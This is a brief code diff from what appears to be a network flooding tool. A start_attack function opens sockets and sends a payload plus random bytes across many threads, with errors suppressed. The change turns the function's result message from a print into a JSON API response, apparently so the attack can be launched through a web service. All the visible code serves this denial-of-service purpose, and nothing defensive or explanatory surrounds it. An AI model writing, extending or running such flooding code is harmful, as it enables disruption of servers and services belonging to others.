@@ -27,7 +27,7 @@ def start_attack():
             s.send(payload.encode())
             s.send(os.urandom(int(num_bytes)))
             s.close()
-        return print("{'success': True, 'message': 'Attack finished successfully.'}")
+        return jsonify({'success': True, 'message': 'Attack finished successfully.'})
         
     for _ in range(int(data.get('threads', 10))):
         with suppress(Exception):
